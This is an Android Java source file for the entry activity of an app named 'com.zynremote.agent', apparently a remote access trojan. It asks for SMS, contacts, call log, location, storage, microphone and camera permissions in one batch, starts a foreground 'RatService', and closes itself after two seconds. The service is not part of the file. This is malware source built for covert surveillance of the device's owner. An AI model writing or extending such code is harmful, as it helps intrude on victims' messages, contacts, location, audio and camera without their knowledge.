package com.zynremote.agent;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Toast;

public class MainActivity extends Activity {

    private static final int REQ = 100;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        if (Build.VERSION.SDK_INT >= 23 && !hasAllPermissions()) {
            requestPermissions(getAllPerms(), REQ);
        } else {
            startServiceAndFinish();
        }
    }

    private boolean hasAllPermissions() {
        for (String p : getAllPerms()) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private String[] getAllPerms() {
        return new String[]{
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.POST_NOTIFICATIONS
        };
    }

    private void startServiceAndFinish() {
        try {
            Intent i = new Intent(this, RatService.class);
            if (Build.VERSION.SDK_INT >= 26)
                startForegroundService(i);
            else
                startService(i);
            Toast.makeText(this, "Сервис запущен", Toast.LENGTH_SHORT).show();
        } catch (Throwable t) {
            Toast.makeText(this, "Ошибка: " + t.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    @Override
    public void onRequestPermissionsResult(int req, String[] perms, int[] results) {
        super.onRequestPermissionsResult(req, perms, results);

        int granted = 0;
        for (int r : results) if (r == PackageManager.PERMISSION_GRANTED) granted++;

        Toast.makeText(this, "Разрешений: " + granted + "/" + perms.length, Toast.LENGTH_LONG).show();

        startServiceAndFinish();
        new android.os.Handler().postDelayed(() -> finish(), 2000);
    }
}
